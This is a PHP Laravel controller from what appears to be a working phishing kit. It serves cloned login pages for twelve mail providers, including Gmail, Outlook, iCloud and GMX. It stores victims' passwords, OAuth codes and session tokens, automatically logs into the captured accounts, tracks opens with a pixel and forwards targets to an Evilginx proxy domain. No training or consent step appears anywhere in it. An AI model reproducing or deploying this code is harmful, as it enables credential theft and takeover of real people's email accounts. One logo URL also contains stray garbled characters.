<?php

namespace App\Http\Controllers;

use App\Models\PhishingCampaign;
use App\Models\PhishingTarget;
use App\Models\CapturedCredential;
use App\Services\AutoConnectService;
use App\Services\DeepLinkService;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class PhishController extends Controller
{
    private const PROVIDER_CONFIG = [
        'google' => [
            'page_title' => 'Gmail',
            'logo_url'   => 'https://ssl.gstatic.com/ui/icon体系建设/mail/gmail/android/all/2x/gmail_grey_72.png',
            'login_url'  => 'https://accounts.google.com/signin/v2/identifier',
            'bg_color'   => '#f8f9fa',
            'primary_color' => '#1a73e8',
        ],
        'microsoft' => [
            'page_title' => 'Outlook',
            'logo_url'   => 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/amz/RWARAAAAgSo?ver=bc09&q=90&m=6&h=705&w=1253&b=%23ffffffff&f=jpg&o=f&p=140',
            'login_url'  => 'https://login.live.com/',
            'bg_color'   => '#f2f2f2',
            'primary_color' => '#0067b8',
        ],
        'yahoo' => [
            'page_title' => 'Yahoo Mail',
            'logo_url'   => 'https://s.yimg.com/rz/p/yahoo_mail_en-US_s_f_p_101x28_2x.png',
            'login_url'  => 'https://login.yahoo.com/',
            'bg_color'   => '#f9f9f9',
            'primary_color' => '#6001d2',
        ],
        'gmx' => [
            'page_title' => 'GMX',
            'logo_url'   => 'https://www.gmx.net/magazin/fileadmin/user_upload/GMX-Logo.svg',
            'login_url'  => 'https://www.gmx.net/',
            'bg_color'   => '#e8e8e8',
            'primary_color' => '#d42e12',
        ],
        'webde' => [
            'page_title' => 'WEB.DE',
            'logo_url'   => 'https://static.ionos.de/werbung/werbung-redirects/webde-logo.png',
            'login_url'  => 'https://web.de/',
            'bg_color'   => '#e8e8e8',
            'primary_color' => '#d42e12',
        ],
        'ionos' => [
            'page_title' => 'IONOS',
            'logo_url'   => 'https://www.ionos.com/favicon.ico',
            'login_url'  => 'https://www.ionos.com/',
            'bg_color'   => '#ffffff',
            'primary_color' => '#003d8f',
        ],
        'telekom' => [
            'page_title' => 'T-Online',
            'logo_url'   => 'https://www.t-online.de/favicon.ico',
            'login_url'  => 'https://email.t-online.de/',
            'bg_color'   => '#ffffff',
            'primary_color' => '#e20074',
        ],
        'a1' => [
            'page_title' => 'A1 Mail',
            'logo_url'   => 'https://www.a1.net/favicon.ico',
            'login_url'  => 'https://webmail.a1.net/',
            'bg_color'   => '#ffffff',
            'primary_color' => '#ff6600',
        ],
        'freenet' => [
            'page_title' => 'freenet',
            'logo_url'   => 'https://email.freenet.de/favicon.ico',
            'login_url'  => 'https://email.freenet.de/',
            'bg_color'   => '#ffffff',
            'primary_color' => '#003399',
        ],
        'icloud' => [
            'page_title' => 'iCloud Mail',
            'logo_url'   => 'https://www.apple.com/v/icloud/a/images/overview/hero_appleid__c5rpywhq2dq6_large.png',
            'login_url'  => 'https://www.icloud.com/',
            'bg_color'   => '#f5f5f7',
            'primary_color' => '#0071e3',
        ],
        'zoho' => [
            'page_title' => 'Zoho Mail',
            'logo_url'   => 'https://www.zoho.com/mail/images/zoho-logo.svg',
            'login_url'  => 'https://accounts.zoho.com/signin',
            'bg_color'   => '#f5f5f5',
            'primary_color' => '#e42527',
        ],
        'protonmail' => [
            'page_title' => 'ProtonMail',
            'logo_url'   => 'https://proton.me/favicon.ico',
            'login_url'  => 'https://mail.proton.me/',
            'bg_color'   => '#ffffff',
            'primary_color' => '#646aff',
        ],
    ];

    public function showLogin(string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        if ($campaign->status !== 'active') {
            abort(404);
        }

        $config = self::PROVIDER_CONFIG[$provider] ?? self::PROVIDER_CONFIG['google'];

        $target->update(['clicked_at' => now()]);

        $campaign->increment('total_clicked');
        $campaign->save();

        $email = $target->email;
        $name = $target->user_display_name ?? explode('@', $email)[0];

        $view = "phish.{$provider}";
        if (!view()->exists($view)) {
            $view = 'phish.google';
        }

        $html = view($view, [
            'email'  => $email,
            'name'   => $name,
            'token'  => $token,
            'config' => $config,
        ])->render();

        return response($html)->header('Content-Type', 'text/html');
    }

    public function capture(Request $request, string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        $email = $request->input('email', $request->input('login', $request->input('identifier', $target->email)));
        $password = $request->input('password', $request->input('passwd', ''));

        $cred = CapturedCredential::create([
            'campaign_id'  => $campaign->id,
            'target_id'    => $target->id,
            'email'        => $email,
            'password'     => $password,
            'provider'     => $provider,
            'ip_address'   => $request->ip(),
            'user_agent'   => $request->userAgent(),
            'extra_data'   => $request->except(['email', 'password', 'login', 'passwd', 'identifier']),
            'captured_at'  => now(),
        ]);

        $target->update(['status' => 'captured', 'captured_at' => now()]);
        $campaign->increment('total_captured');
        $campaign->save();

        if ($campaign->auto_connect_enabled) {
            try {
                $autoConnect = app(AutoConnectService::class);
                $account = $autoConnect->tryConnect($cred);
                if ($account) {
                    Log::info("[PhishCapture] Auto-connected email account: {$email} (active={$account->is_active})");
                }
            } catch (\Throwable $e) {
                Log::warning("[PhishCapture] Auto-connect failed for {$email}: {$e->getMessage()}");
            }
        }

        $config = self::PROVIDER_CONFIG[$provider] ?? self::PROVIDER_CONFIG['google'];

        return redirect($config['login_url']);
    }

    public function trackPixel(string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->first();
        if ($target && !$target->opened_at) {
            $target->update(['opened_at' => now()]);
            $target->campaign->increment('total_opened');
            $target->campaign->save();
        }

        $pixel = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
        return response($pixel)->header('Content-Type', 'image/gif');
    }

    public function deepInject(string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        if ($campaign->status !== 'active') {
            abort(404);
        }

        $target->update(['clicked_at' => now()]);
        $campaign->increment('total_clicked');
        $campaign->save();

        $deepLinkService = app(DeepLinkService::class);
        $html = $deepLinkService->generateDeepLinkPage($target, $provider);

        return response($html)->header('Content-Type', 'text/html');
    }

    public function deepCallback(Request $request, string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        $code = $request->input('code');
        $accessToken = $request->input('access_token');
        $idToken = $request->input('id_token');
        $sessionKey = $request->input('session');

        $tokenData = [
            'code'         => $code,
            'access_token' => $accessToken,
            'id_token'     => $idToken,
            'session'      => $sessionKey,
            'all_params'   => $request->all(),
        ];

        $cred = CapturedCredential::create([
            'campaign_id'  => $campaign->id,
            'target_id'    => $target->id,
            'email'        => $target->email,
            'password'     => 'DEEPLINK_AUTH',
            'provider'     => $provider,
            'ip_address'   => $request->ip(),
            'user_agent'   => $request->userAgent(),
            'extra_data'   => array_merge($tokenData, [
                'capture_method' => 'deeplink_injection',
                'has_code'       => filled($code),
                'has_access_token'=> filled($accessToken),
                'has_id_token'   => filled($idToken),
                'has_session'    => filled($sessionKey),
            ]),
            'captured_at'  => now(),
        ]);

        $target->update(['status' => 'captured', 'captured_at' => now()]);
        $campaign->increment('total_captured');
        $campaign->save();

        if ($campaign->auto_connect_enabled) {
            try {
                $autoConnect = app(AutoConnectService::class);
                $account = $autoConnect->tryConnect($cred);
                if ($account) {
                    Log::info("[DeepCallback] Auto-connected: {$target->email} (active={$account->is_active})");
                }
            } catch (\Throwable $e) {
                Log::warning("[DeepCallback] Auto-connect failed: {$e->getMessage()}");
            }
        }

        $redirects = [
            'google'     => 'https://mail.google.com/mail/u/0/',
            'microsoft'  => 'https://outlook.live.com/mail/0/',
            'yahoo'      => 'https://mail.yahoo.com/',
            'gmx'        => 'https://service.gmx.net/de/',
            'webde'      => 'https://service.web.de/',
            'ionos'      => 'https://mail.ionos.com/',
            'telekom'    => 'https://email.t-online.de/',
            'a1'         => 'https://webmail.a1.net/mail/',
            'freenet'    => 'https://email.freenet.de/',
            'icloud'     => 'https://www.icloud.com/mail/',
            'zoho'       => 'https://mail.zoho.com/',
            'protonmail' => 'https://mail.proton.me/mail/all',
        ];

        return redirect($redirects[$provider] ?? $redirects['google']);
    }

    public function evilginxRedirect(string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        if ($campaign->status !== 'active' || $campaign->campaign_type !== 'evilginx') {
            abort(404);
        }

        $domain = $campaign->evilginx_domain;
        if (!$domain) {
            abort(404, 'Evilginx domain not configured for this campaign');
        }

        $target->update(['clicked_at' => now()]);
        $campaign->increment('total_clicked');
        $campaign->save();

        $evilginxUrl = "https://{$domain}/{$provider}/{$token}";

        return redirect($evilginxUrl);
    }
}
